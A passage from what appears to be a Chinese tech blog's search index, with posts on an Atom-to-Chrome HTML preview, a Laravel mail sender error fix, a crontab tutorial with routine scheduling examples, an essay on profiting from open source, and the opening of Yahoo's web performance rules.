<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;Welcome!&#x27;)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    点击这里</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;Hello, World!&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;</span></span></span><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is a heading<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><span class="language-xml">&quot;);</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="一键用-chrome-浏览器打开当前编辑的文件"><a href="#一键用-chrome-浏览器打开当前编辑的文件" class="headerlink" title="一键用 chrome 浏览器打开当前编辑的文件"></a>一键用 chrome 浏览器打开当前编辑的文件</h2><p>保存。然后按快捷键 ctrl+2，就用 google-chrome 打开了 foo.html！</p>
<p>我的天！真的启动了 google-chrome，打开了 foo.html！</p>
<p>这意味着，atom 开发前端代码可以随时用 chrome 调试！太方便了！</p>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Atom</tag>
      </tags>
  </entry>
  <entry>
    <title>Laravel5.1 邮件发送报错 Swift_TransportException</title>
    <url>/2017/06/laravel-email/</url>
    <content><![CDATA[<h2 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Swift_TransportException <span class="keyword">in</span> AbstractSmtpTransport.php <span class="built_in">line</span> <span class="number">162</span>: Cannot <span class="built_in">send</span> message <span class="keyword">without</span> <span class="keyword">a</span> sender</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="问题发现"><a href="#问题发现" class="headerlink" title="问题发现"></a>问题发现</h2><p>使用 laravel 的用户认证系统时，php artisan make:auth 后自动生成注册和登录视图，以及所有的认证路由。</p>
<p>同时生成 HomeController，但是重置密码时 &#x2F;password&#x2F;reset 发送邮件抛出如题异常。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>看报错字面意思，缺少 sender 不能发送信息，应该是配置参数的问题</p>
<p>确保.env 配置文件中的邮件发送相关配置填写无误</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">config/mail.php 配置文件中第 <span class="number">58</span> 行<span class="string">&#x27;from&#x27;</span> =&gt; [<span class="string">&#x27;address&#x27;</span> =&gt; <span class="keyword">null</span>, <span class="string">&#x27;name&#x27;</span> =&gt; <span class="keyword">null</span>], 填写地址和名称即可解决问题</span><br></pre></td></tr></table></figure>

<p>邮件发送成功</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>Crontab 详解</title>
    <url>/2017/07/linux-crontab/</url>
    <content><![CDATA[<h2 id="linux-下定时执行任务的方法"><a href="#linux-下定时执行任务的方法" class="headerlink" title="linux 下定时执行任务的方法"></a>linux 下定时执行任务的方法</h2><p>在 LINUX 中你应该先输入 <code>crontab -e</code>，然后就会有个 vi 编辑界面，再输入 <code>0 3 * * 1 /clearigame2</code> 内容到里面 :wq 保存退出。</p>
<span id="more"></span>

<p>在 LINUX 中，周期执行的任务一般由 cron 这个守护进程来处理 [ps -ef|grep cron]。cron 读取一个或多个配置文件，这些配置文件中包含了命令行及其调用时间。</p>
<p>cron 的配置文件称为 “crontab”，是 “cron table” 的简写。</p>
<h2 id="一、cron-在-3-个地方查找配置文件："><a href="#一、cron-在-3-个地方查找配置文件：" class="headerlink" title="一、cron 在 3 个地方查找配置文件："></a>一、cron 在 3 个地方查找配置文件：</h2><p><code>/var/spool/cron/</code> 这个目录下存放的是每个用户包括 root 的 crontab 任务，每个任务以创建者的名字命名，比如 tom 建的 crontab 任务对应的文件就是 <code>/var/spool/cron/tom</code>。</p>
<p>一般一个用户最多只有一个 crontab 文件。</p>
<h2 id="二、-etc-crontab-这个文件负责安排由系统管理员制定的维护系统以及其他任务的-crontab。"><a href="#二、-etc-crontab-这个文件负责安排由系统管理员制定的维护系统以及其他任务的-crontab。" class="headerlink" title="二、&#x2F;etc&#x2F;crontab 这个文件负责安排由系统管理员制定的维护系统以及其他任务的 crontab。"></a>二、&#x2F;etc&#x2F;crontab 这个文件负责安排由系统管理员制定的维护系统以及其他任务的 crontab。</h2><h2 id="三、-etc-cron-d-这个目录用来存放任何要执行的-crontab-文件或脚本。"><a href="#三、-etc-cron-d-这个目录用来存放任何要执行的-crontab-文件或脚本。" class="headerlink" title="三、&#x2F;etc&#x2F;cron.d&#x2F; 这个目录用来存放任何要执行的 crontab 文件或脚本。"></a>三、&#x2F;etc&#x2F;cron.d&#x2F; 这个目录用来存放任何要执行的 crontab 文件或脚本。</h2><h2 id="四、权限"><a href="#四、权限" class="headerlink" title="四、权限"></a>四、权限</h2><p>crontab 权限问题到 &#x2F;var&#x2F;adm&#x2F;cron&#x2F; 下一看，文件 cron.allow 和 cron.deny 是否存在</p>
<h2 id="用法如下："><a href="#用法如下：" class="headerlink" title="用法如下："></a>用法如下：</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、如果两个文件都不存在，则只有 root 用户才能使用 crontab 命令。 </span><br><span class="line"><span class="number">2</span>、如果 cron<span class="selector-class">.allow</span> 存在但 cron<span class="selector-class">.deny</span> 不存在，则只有列在 cron<span class="selector-class">.allow</span> 文件里的用户才能使用 crontab 命令，如果 root 用户也不在里面，则 root 用户也不能使用 crontab。 </span><br><span class="line"><span class="number">3</span>、如果 cron<span class="selector-class">.allow</span> 不存在，cron<span class="selector-class">.deny</span> 存在，则只有列在 cron<span class="selector-class">.deny</span> 文件里面的用户不能使用 crontab 命令，其它用户都能使用。 </span><br><span class="line"><span class="number">4</span>、如果两个文件都存在，则列在 cron<span class="selector-class">.allow</span> 文件中而且没有列在 cron<span class="selector-class">.deny</span> 中的用户可以使用 crontab，如果两个文件中都有同一个用户，</span><br><span class="line">以 cron<span class="selector-class">.allow</span> 文件里面是否有该用户为准，如果 cron<span class="selector-class">.allow</span> 中有该用户，则可以使用 crontab 命令。</span><br></pre></td></tr></table></figure>

<p>在 crontab 文件中如何输入需要执行的命令和时间。该文件中每行都包括六个域，其中前五个域是指定命令被执行的时间，最后一个域是要被执行的命令。</p>
<h2 id="每个域之间使用空格或者制表符分隔。格式如下："><a href="#每个域之间使用空格或者制表符分隔。格式如下：" class="headerlink" title="每个域之间使用空格或者制表符分隔。格式如下："></a>每个域之间使用空格或者制表符分隔。格式如下：</h2><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">minute</span> <span class="built_in">hour</span> <span class="built_in">day</span>-of-<span class="built_in">month</span> <span class="built_in">month</span>-of-<span class="built_in">year</span> <span class="built_in">day</span>-of-<span class="built_in">week</span> commands</span><br></pre></td></tr></table></figure>

<p>合法值 00-59 00-23 01-31 01-12 0-6 (0 is sunday) commands（代表要执行的脚本）</p>
<p>除了数字还有几个个特殊的符号就是 “<em>“、”&#x2F;“ 和 “-“、”,”，</em> 代表所有的取值范围内的数字，”&#x2F;“ 代表每的意思，”&#x2F;5” 表示每 5 个单位，”-“ 代表从某个数字到某个数字，”,” 分<br>开几个离散的数字。</p>
<h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式 :"></a>基本格式 :</h2><figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">* * * * * command</span><br><span class="line"></span><br><span class="line">分　 时　 日　 月　 周　 命令</span><br><span class="line"></span><br><span class="line">第<span class="number"> 1 </span>列表示分钟 1～59 每分钟用 * 或者 */1 表示</span><br><span class="line"></span><br><span class="line">第<span class="number"> 2 </span>列表示小时 1～23（0 表示<span class="number"> 0 </span>点）</span><br><span class="line"></span><br><span class="line">第<span class="number"> 3 </span>列表示日期 1～31</span><br><span class="line"></span><br><span class="line">第<span class="number"> 4 </span>列表示月份 1～12</span><br><span class="line"></span><br><span class="line">第<span class="number"> 5 </span>列标识号星期 0～6（0 表示星期天）</span><br><span class="line"></span><br><span class="line">第<span class="number"> 6 </span>列要运行的命令</span><br></pre></td></tr></table></figure>
<h2 id="crontab-文件的一些例子："><a href="#crontab-文件的一些例子：" class="headerlink" title="crontab 文件的一些例子："></a>crontab 文件的一些例子：</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#每晚的 21:30 重启 apache。</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">30</span> <span class="number">21</span> * * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line"></span><br><span class="line"><span class="comment">#每月 1、10、22 日</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">45</span> <span class="number">4</span> <span class="number">1</span>,<span class="number">10</span>,<span class="number">22</span> * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line"></span><br><span class="line"><span class="comment">#每天早上 6 点 10 分</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">10</span> <span class="number">6</span> * * * date</span><br><span class="line"></span><br><span class="line"><span class="comment">#每两个小时</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span> */<span class="number">2</span> * * * date</span><br><span class="line"></span><br><span class="line"><span class="comment">#晚上 11 点到早上 8 点之间每两个小时，早上 8 点</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span> <span class="number">23</span>-<span class="number">7</span>/<span class="number">2</span>，<span class="number">8</span> * * * date</span><br><span class="line"></span><br><span class="line"><span class="comment">#每个月的 4 号和每个礼拜的礼拜一到礼拜三的早上 11 点</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span> <span class="number">11</span> <span class="number">4</span> * mon-wed date</span><br><span class="line"></span><br><span class="line"><span class="comment">#1 月份日早上 4 点</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span> <span class="number">4</span> <span class="number">1</span> jan * date </span><br></pre></td></tr></table></figure>

<h2 id="秒级别执行"><a href="#秒级别执行" class="headerlink" title="秒级别执行"></a>秒级别执行</h2><p>很多时候，我们计划任务需要精确到秒来执行，根据以下方法，可以很容易地以秒执行任务。</p>
<p>以下方法将每 10 秒执行一次</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">* * * * * <span class="regexp">/bin/</span><span class="built_in">date</span> &gt;&gt;<span class="regexp">/tmp/</span><span class="built_in">date</span>.txt</span><br><span class="line"></span><br><span class="line">* * * * * sleep <span class="number">10</span>;<span class="regexp">/bin/</span><span class="built_in">date</span> &gt;&gt;<span class="regexp">/tmp/</span><span class="built_in">date</span>.txt</span><br><span class="line">* * * * * sleep <span class="number">20</span>; <span class="regexp">/bin/</span><span class="built_in">date</span> &gt;&gt;<span class="regexp">/tmp/</span><span class="built_in">date</span>.txt</span><br><span class="line">* * * * * sleep <span class="number">30</span>; <span class="regexp">/bin/</span><span class="built_in">date</span> &gt;&gt;<span class="regexp">/tmp/</span><span class="built_in">date</span>.txt</span><br><span class="line">* * * * * sleep <span class="number">40</span>; <span class="regexp">/bin/</span><span class="built_in">date</span> &gt;&gt;<span class="regexp">/tmp/</span><span class="built_in">date</span>.txt</span><br><span class="line">* * * * * sleep <span class="number">50</span>; <span class="regexp">/bin/</span><span class="built_in">date</span> &gt;&gt;<span class="regexp">/tmp/</span><span class="built_in">date</span>.txt</span><br></pre></td></tr></table></figure>
<p>　　<br>注意如果用如果命令用到 % 的话需要用 \ 转义</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">00 </span><span class="number">01</span> * * * mysqldump -u root --password=passwd-d mustang &gt; /root/backups/mustang_$(date +\%Y\%m\%d_\%H\%M\%S).sql</span><br><span class="line"></span><br><span class="line"><span class="symbol">01 </span><span class="number">01</span> * * * mysqldump -u root --password=passwd-t mustang &gt; /root/backups/mustang-table_$(date +\%Y\%m\%d_\%H\%M\%S).sql</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>利益至上，开源也不免于此</title>
    <url>/2017/07/open-source/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>摘要：在刚刚诞生的初级阶段，开源软件就像是公益之心带给这个世界的一份圣洁礼物。然而随着低成本营销、讨价还价、对竞争对手展开阻击 —— 开源行业不再只与 “免费” 挂钩，暴利已经随处可见。企业如何利用开源来赚取利润？ </p>
<span id="more"></span>

<p>在刚刚诞生的初级阶段，开源软件就像是公益之心带给这个世界的一份圣洁礼物。程序员们努力工作，然后将自己的劳动成果交给任何一位能够从中获得帮助的用户手中。这是一种纯粹的慈善行为，每个人都将从中受益。那么开源和盈利到底有着什么关系呢？</p>
<p>然而随着时间的推移，不少企业开始意识到自己完全可以从开源身上掘取利润，并像以往那样把软件当作产品进行出售。如此一来，他们既做了好事、也得得到应有的回报。对于某些早期开源倡导者来说，这样的思维方式并不会造成冲击 —— 相反，这是非常正常的发展方向。开源行业的领军人物之一 Richard Stallman 就认为 “言论自由” 要比 “免费啤酒” 重要得多。他一直秉持着这样的思路：企业可以对开源成果进行任何调整 —— 只要他们不剥夺普通用户修改代码并发布成果的权利就行。</p>
<p>很多企业把 Stallman 的言论视为凭借开源赚取利润并改变自身命运的神圣祝福。少数最聪明的家伙想到可以利用开源项目增强自身业务、推广自家品牌并扩大企业在行业中的影响力。于是，开源已经不再像过去那样属于纯粹的慈善行为 —— 它开始变成另一种营销工具，并通过异于以往的方式挤进了商业市场。</p>
<p>既然开源现在和盈利的关系如此难舍难分，那么接下来，我们就来讲讲利用开源来赚取利润的的几个途径。虽然有些人会对这样的行为、想法无法理解以至于排斥，但是繁荣的商业体系对项目的支持效果远远超过一堆代码，毕竟面对前途未卜的未来，单靠慈善之心是不够。</p>
<h2 id="途径一：利用开源进行低成本营销"><a href="#途径一：利用开源进行低成本营销" class="headerlink" title="途径一：利用开源进行低成本营销"></a>途径一：利用开源进行低成本营销</h2><p>打广告要价不菲、办展览烧钱神速，对于企业来说，营销预算永远极度吃紧。这时，很多企业开始将目光投向开源代码，这绝对是一套理想而廉价的宣传方案。以开源形式发布全部或者部分产品不仅能够成功吸引到用户的注意，同时还可以帮助他们了解产品的实际用途。既宣传了产品、又吸引了客户，有了这样良好的宣传基础，营销团队能够把更多精力放在与销售活动相关的后续工作身上。</p>
<p>某些开源企业，例如 MySQL，曾经明确表示，把关注重点放在有多少用户能够免费享受自己的产品上是个严重的错误。一般来说，企业不会到处宣扬自己的用户中有九成以上根本没付过钱 —— 理由很简单，由于开源软件包的发布成本极低、向更多用户提供产品根本不会产生多少额外支出。</p>
<p>从开源产品中赚取利润的诀窍在于，确保自己打算用于收费的功能具备足够的用户吸引力，并借此为产品的其它组件提供经济支持。收费的部分在整款产品中所占比例不能太大，但一定要拥有充足的理由让目标客户掏出钱来。有时候这可能是一项额外功能，例如保证那些关注稳定性的企业客户能够获得全天候的软件流畅运行效果。还有一些厂商要求一部分用户以匿名方式帮助其推广工作成果，作为回报，用户能够获得产品的开源版本使用权。这些小技巧如今已经被全世界成千上万企业所采用。</p>
<h2 id="途径二：利用开源代码降低维护成本"><a href="#途径二：利用开源代码降低维护成本" class="headerlink" title="途径二：利用开源代码降低维护成本"></a>途径二：利用开源代码降低维护成本</h2><p>遇上难题了？这里有一大堆代码，自己找答案吧。</p>
<p>虽然这听起来有些不尽人情，但很多开源企业确实会在技术支持工作中直接向用户提供与问题对应的源代码。那些专有型企业需要编写复杂的描述文档来解释 API 的实际作用，但开源企业只需要将经过解码的 API 扔到网上就行了。任何人都有权阅读这些源代码 —— 而且大部分人也确实会读读看。时至今日，很多企业都会为自己的软件产品设立一套技术支持论坛，难题在这里能够更快得到解决。</p>
<p>很好，拥有良好说明文档的开源软件将成为每一位参与者的宝贵财富。有了这笔财富，客户将有能力自己动手解决问题，而不必再坐等技术支持人员一点点发掘代码内容。支持团队能够免去亲手将代码翻译成英文的麻烦，因为这些工作完全可以交给充满活力的技术社区来完成 —— 每个人都能从开源中受益，标准的大团圆结局。</p>
<h2 id="途径三：利用开源降低开发成本"><a href="#途径三：利用开源降低开发成本" class="headerlink" title="途径三：利用开源降低开发成本"></a>途径三：利用开源降低开发成本</h2><p>您的企业需要一款工具、资源库或者组件，但组织内部开发实在成本高昂、难以承受。现在，只要大家脑子稍微一动、往开源上想想，项目就相当于已经完成一半了。花钱雇人添加必要功能也许太过愚蠢、太过慷慨，因为开源许可规定所有相关成果都必须拿出来同大家分享。但换个角度看，开源开发也能帮大家节约一半支出。如果这款软件并不是业务流程中的关键性组成部分，那么利用开源很可能是一种聪明的省钱方式。</p>
<p>某些公司会通过向自己了解并信任的开发人员支付报酬来解决上述难题。另一些则利用自身的宣传影响力替参与项目开发的人员造势。目前，以 BountrySource 为代表的一些众包网站允许用户自行筹集资金雇佣程序员开发代码。这些程序员与项目本身并无关系，搞定自己的工作后带着钱离开，但他们的成果却将长久留存。</p>
<p>在某些情况下，多家企业可以团结起来共同开发同一套开源代码库，这样每家公司在做出贡献时需要支付的成本就低得多。他们在节省资金的同时也打造出一套关键性工具，且每位参与者都有权加以使用 —— 这实在是种经济实惠的妙招。即使只找到一家合作伙伴，开发成本也能立刻被削减一半。如果是十家企业组成联盟，那么成本就只相当于整个项目支出的十分之一。</p>
<h2 id="途径四：利用开源代码打击竞争对手"><a href="#途径四：利用开源代码打击竞争对手" class="headerlink" title="途径四：利用开源代码打击竞争对手"></a>途径四：利用开源代码打击竞争对手</h2><p>当谷歌刚刚推出其 Android 操作系统时，苹果的 iPhone 在智能手机市场上正占据着压倒性的数量优势。然而 Android 作为一款开源平台，能够保证谷歌与其它手机制造厂商更轻松地携手合作、从而创建起蓬勃发展的健康环境。每个人都可以使用来自这个开源联盟的应用产品。开源许可使每家公司都以平等的参与者身份访问项目、获取源代码并加以控制。他们选择 Android 的同时也相当于选择了安全的未来，因为他们知道谷歌不会放弃这个生机勃勃的项目。</p>
<p>这种共享式流程正变得越来越普遍。作为由 Rackspace 提供赞助的项目，OpenStack 允许小型云厂商汇聚起来使用一套通用型平台，其吸引力远远超过目前市场上占统治地位的 Amazon 云。客户不仅能够从多家厂商当中随意做出选择，同时也可以在自己的数据中心内部安装云工具。所有围绕 OpenStack 建立起来的云体系都采用同样的基础结构，而且同一套脚本也保证可以在任何环境下正常运行。</p>
<h2 id="途径五：利用开源资源创造竞争者"><a href="#途径五：利用开源资源创造竞争者" class="headerlink" title="途径五：利用开源资源创造竞争者"></a>途径五：利用开源资源创造竞争者</h2><p>开源许可让一件事情变得更加简单：创造一位竞争者。从零开始建立一家新企业的过程中，我们只需要访问源代码库并从中寻找可资利用的数据即可。在下载完成之后，大家可以直接将其整理为方案并马上以竞争者的姿态向行业前辈叫板 —— 没错，这一切都可以分分钟搞定。</p>
<p>不过创造一位竞争者与为之持续提供技术支持有着本质不同。下载代码毫无难度，但让自身拥有基础技能则需要耗时数月。要想成为真正的专家，整个过程甚至会持续数年。真正的竞争者意味着建立起一个技术团队，且有能力为用户提供真正的专业知识。</p>
<p>正因为如此，此类根基不牢的竞争者才仅仅出现在那些供给远低于需求量的领域当中。几年之前，当 Hadoop 引发技术行业的广泛关注时，新兴企业开始如雨后春笋般大量涌现。每家公司在寝阶段都采用同样的 Hadoop 核心，但随着时间的推移，他们很快开始提供独此一家的特殊附加方案。</p>
<h2 id="途径六：利用开源在市场上保持竞争力"><a href="#途径六：利用开源在市场上保持竞争力" class="headerlink" title="途径六：利用开源在市场上保持竞争力"></a>途径六：利用开源在市场上保持竞争力</h2><p>开源世界的竞争是一条双行道。尽管任何人都可以在几秒钟内参与进来并获得源代码，但他们通常需要在许可的约束下将自己的全部创新成果作为贡献回馈给开源项目。如果新兴竞争者水平高超，那么所有老牌强队也将能够获取前者带来的研发杰作。以 GPL 为代表的不少主流许可要求每位参与者都必须彼此分享技术果实。</p>
<p>这种除了共享还是共享的规则使新兴参与者很难真正与现有领导者相抗衡。这些领导者能够轻松获得全部由后起之秀带来的创新方案，而创新者则享受不到太多成果本身带来的收益。这样的规则在简化了竞争者出现的机制之余，也使他们几乎无法在竞争当中蓬勃发展。</p>
<p>作为早期开源推动者 Cygnusr 创始人，Michael Tiemann 曾经颇有先见之明地表示：“非常幸运，开源模式再次派上了用场。除非新兴竞争者能够与我们旗下由一百多位工程师 —— 其中大部分是受支持软件的主要开发者或者维护者 —— 所组成的技术团队相对抗，否则他们无法取代我们‘GNU 真正根源’这一稳固地位。即使从最乐观的角度讲，他们也只能通过添加增量功能让客户掏钱。不过由于软件本身的开源属性，他们所创造的所有价值都将反映在 Cygnus 这里。”</p>
<p>虽然这样的言论听起来像是来自邪恶的垄断者，但其中也并非毫无破绽。如果当前开源领导者的工作做得不好，把资金投入到毫无意义的功能强化或者挥霍到毫无附加价值的方面，新兴竞争者完全可以找机会取而代之 —— 这并不是不可能的。</p>
<p>另外需要强调的是，如果有正当理由支持同一套代码基础分别存在于两种方案当中，那么开源许可将无法制约后起之秀的发展。例如，同一款软件具备两种完全不同的使用途径，那么两个团队能够轻松将彼此的业务重点区分开来。总而言之，只要方案能够指向另一个截然不同的竞争市场，那么新秀与老将之间就不再是势不两立的对手关系。</p>
<h2 id="途径七：利用开源进行讨价还价"><a href="#途径七：利用开源进行讨价还价" class="headerlink" title="途径七：利用开源进行讨价还价"></a>途径七：利用开源进行讨价还价</h2><p>虽然不少开源许可都相当灵活，但其中一些正变得愈发严厉。作为其中最新的一项许可，Affero GPL 坚持认为只要代码被运行在公共服务器上、那么这些代码就必须实现共享。这项严厉许可的出台是由于在过去一段时期，开源行业发现某些开发商尝试从开源软件中获益、但却逃避为其做出贡献。他们拒不向软件提供 “贡献”，却恬不知耻地加以运行 —— 有鉴于此，GPL 要求参与者只能在做出 “贡献” 之后才有资格获得共享权利。</p>
<p>某些开发商认为这样的要求并不难做到。他们可能只是尝试或者提供一些免费服务，分享自己对软件的改进但前提是这些改进并没有关键到会让自己推动竞争优势。但已经有越来越多的企业发现跟规则绕弯子比直接购买商业许可更麻烦。开源许可正以强大的力量推动参与企业走向产品支持的道路。</p>
<p>Affero GPL 已经成为众多新兴项目的理想选择，其中包括 NoSQL 数据存储方案。以 MongoDB 为例，它就为自己的核心工具 —— 数据库搭配了该许可。不过该公司选择了条件更为宽松的 Apache 许可对驱动程序加以保护，旨在鼓励人们更积极地与其核心产品进行对接。</p>
<h2 id="途径八：利用开源开发共享式标准"><a href="#途径八：利用开源开发共享式标准" class="headerlink" title="途径八：利用开源开发共享式标准"></a>途径八：利用开源开发共享式标准</h2><p>每一种业务、每一类市场都需要一套执行标准，从而帮助客户建立正确的期望、帮助企业了解该交付什么样的产品。开源代码往往能在建立这些标准的互操作性方面帮上大忙。</p>
<p>以 HTML 为例，我们利用这种语言来标记网络上的文档 —— 但这项至关重要的标准也是 Web 浏览器行业竞争的根本性基石之一。一旦整个行业承认 HTML 标准的核心地位，那么浏览器厂商就能够在功能而非内容方面做出创新并进行竞争。另一方面，内容提供方则需要保证自己生成的 Web 页面能够在所有可用浏览器上正常显示。</p>
<p>开源工具往往与处于不断发展态势下的标准密不可分。以移动浏览器市场为例，苹果公司率先创建出 WebKit 渲染引擎，并使其在很大程度成为移动浏览器的定义与标杆。然而最终使其发扬光大的却是谷歌及其它 Android 厂商。苹果可以继续掌握这项技术的专利，但这意味着 iPhone 与其它智能手机之间的互操作性将受到严重制约，或者在每一次互操作时都需要将网页 (而且只是少数内容不多的网页，大部分正常页面无法实现翻译) 通过翻译转化成经过渲染、可为其它智能手机所读取的内容。这很可能对移动市场的拓展造成严重的负面影响。因此，苹果选择将其作为开源工具包推向公众，从而借助各市场竞争者之力将其打造成一套通用型标准。</p>
<h2 id="途径九：利用开源掌控未来"><a href="#途径九：利用开源掌控未来" class="headerlink" title="途径九：利用开源掌控未来"></a>途径九：利用开源掌控未来</h2><p>已经有众多企业，有大有小，开始鼓励自己的全职员工从事开源项目。有些公司甚至把花费大量资金创建的代码直接贡献给开源项目。为什么要这么做？这是为了确保自己在开源项目的代码基础中拥有足够的影响力，而实现这一目标最简单的办法就是贡献代码行。</p>
<p>这种影响力永远不会消退。所有重大项目，例如 Linux 的大多数重要贡献者如今已经被证实都受到了所在公司的授意。当然，最终目标在于确保开源代码仍然与企业自身的发展方向相吻合。如果资源库或者工具不断增长，新功能有可能同企业的专有工具之间出现兼容性问题。但如果该公司在新功能当中贡献了大量代码，则有能力确保最终成果适应自己的业务需求。正如 Alto 发明者 Alan Kay 所说，” 掌控未来的最佳方式就是亲手把它发明出来。“</p>
]]></content>
      <categories>
        <category>OpenSource</category>
      </categories>
  </entry>
  <entry>
    <title>Yahoo 团队经验：网站性能优化的 34 条黄金法则</title>
    <url>/2017/07/yahoo-team/</url>
    <content><![CDATA[<h2 id="1、尽量减少-HTTP-请求次数"><a href="#1、尽量减少-HTTP-请求次数" class="headerlink" title="1、尽量减少 HTTP 请求次数"></a>1、尽量减少 HTTP 请求次数</h2><p>终端用户响应的时间中，有 80% 用于下载各项内容。这部分时间包括下载页面中的图像、样式表、脚本、Flash 等。通过减少页面中的元素可以减少 HTTP 请求的次数。这是提高网页速度的关键步骤。 </p>
<p>减少页面组件的方法其实就是简化页面设计。那么有没有一种方法既能保持页面内容的丰富性又能达到加快响应时间的目的呢？这里有几条减少 HTTP 请求次数同时又可能保持页面内容丰富的技术。 </p>
<span id="more"></span>

<p>合并文件是通过把所有的脚本放到一个文件中来减少 HTTP 请求的方法，如可以简单地把所有的 CSS 文件都放入一个样式表中。当脚本或者样式表在不同页面中使用时需要做不同的修改，这可能会相对麻烦点，但即便如此也要把这个方法作为改善页面性能的重要一步。 </p>
<p>CSS Sprites 是减少图像请求的有效方法。把所有的背景图像都放到一个图片文件中，然后通过 CSS 的 background-image 和 background-position 属性来显示图片的不同部分； </p>
<p>图片地图是把多张图片整合到一张图片中。虽然文件的总体大小不会改变，但是可以减少 HTTP 请求次数。图片地图只有在图片的所有组成部分在页面中是紧挨在 一起的时候才能使用，如导航栏。确定图片的坐标和可能会比较繁琐且容易出错，同时使用图片地图导航也不具有可读性，因此不推荐这种方法； </p>
<p>内联图像是使用 data:URL scheme 的方法把图像数据加载页面中。这可能会增加页面的大小。把内联图像放到样式表（可缓存）中可以减少 HTTP 请求同时又避免增加页面文件的大小。但是内联图像现在还没有得到主流浏览器的支持。 </p>
<p>减少页面的 HTTP 请求次数是你首先要做的一步。这是改进首次访问用户等待时间的最重要的方法。如同 Tenni Theurer 的他的博客 Browser Cahe Usage – Exposed! 中所说，HTTP 请求在无缓存情况下占去了 40% 到 60% 的响应时间。让那些初次访问你网站的人获得更加快速的体验吧！ </p>
<h2 id="2、减少-DNS-查找次数"><a href="#2、减少-DNS-查找次数" class="headerlink" title="2、减少 DNS 查找次数"></a>2、减少 DNS 查找次数</h2><p>域名系统（DNS）提供了域名和 IP 的对应关系，就像电话本中人名和他们的电话号码的关系一样。当你在浏览器地址栏中输入 <span class="exturl" data-url="aHR0cDovL3d3dy5kdWRvLm9yZy8=">www.dudo.org<i class="fa fa-external-link-alt"></i></span> 时，DNS 解析服务器就会返回这个域名对应的 IP 地址。DNS 解析的过程同样也是需要时间的。一般情况下返回给定域名对应的 IP 地址会花费 20 到 120 毫 秒的时间。而且在这个过程中浏览器什么都不会做直到 DNS 查找完毕。 </p>
<p>缓存 DNS 查找可以改善页面性能。这种缓存需要一个特定的缓存服务器，这种服务器一般属于用户的 ISP 提供商或者本地局域网控制，但是它同样会在用户使用 的计算机上产生缓存。DNS 信息会保留在操作系统的 DNS 缓存中（微软 Windows 系统中 DNS Client Service）。大多数浏览器有独立于操作系统以外的自己的缓存。由于浏览器有自己的缓存记录，因此在一次请求中它不会受到操作系统的影响。 </p>
<p>Internet Explorer 默认情况下对 DNS 查找记录的缓存时间为 30 分钟，它在注册表中的键值为 DnsCacheTimeout。Firefox 对 DNS 的查找 记录缓存时间为 1 分钟，它在配置文件中的选项为 network.dnsCacheExpiration（Fasterfox 把这个选项改为了 1 小时）。 </p>
<p>当客户端中的 DNS 缓存都为空时（浏览器和操作系统都为空），DNS 查找的次数和页面中主机名的数量相同。这其中包括页面中 URL、图片、脚本文件、样式表、Flash 对象等包含的主机名。减少主机名的数量可以减少 DNS 查找次数。 </p>
